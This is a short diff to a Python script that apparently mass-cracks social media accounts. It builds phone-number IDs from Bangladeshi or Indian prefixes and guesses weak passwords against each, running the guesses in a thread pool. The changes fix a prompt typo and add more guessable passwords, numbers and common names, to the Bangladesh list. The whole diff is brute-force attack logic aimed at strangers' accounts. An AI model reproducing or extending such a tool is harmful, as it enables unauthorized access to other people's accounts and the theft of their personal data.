@@ -188,7 +188,7 @@ def bd():
     print(logo)
     print(f'\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] BD SIM : 017-019-018-016')
     linex()
-    code = input(f'\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] CHOICE CORD\033[1;34m = ')
+    code = input(f'\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] CHOICE CODE\033[1;34m = ')
     linex()
     print(f'\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] EXAMPLE: 9999-30000-5000-10000')
     linex()
@@ -205,7 +205,7 @@ def bd():
         print(f"\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] - AIRPLANE MOD ON OFF FOUR OK=ID")
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'708090','203040','506070','ayesha','Bangladesh','jannat']
+            pwx = [love[2:],love,code+love,code+love[:3],'708090','203040','506070','ayesha','Bangladesh','jannat','112255','112266','1122555','ariyan','hridoy','00009999','123412']
             ids = code+love
             cyberboos.submit(jihad,ids,pwx,tl)
     print('\033[1;37m')
@@ -244,7 +244,7 @@ def ind():
         linex()
         for love in user:
             ids = code+love
-            pwx = [ids,"57273200","59039200"," India123", "10002000",]
+            pwx = [ids,'57273200','59039200','10002000',]
             cyber.submit(jihad,ids,pwx,tl)
     print('\033[1;37m')
     linex()
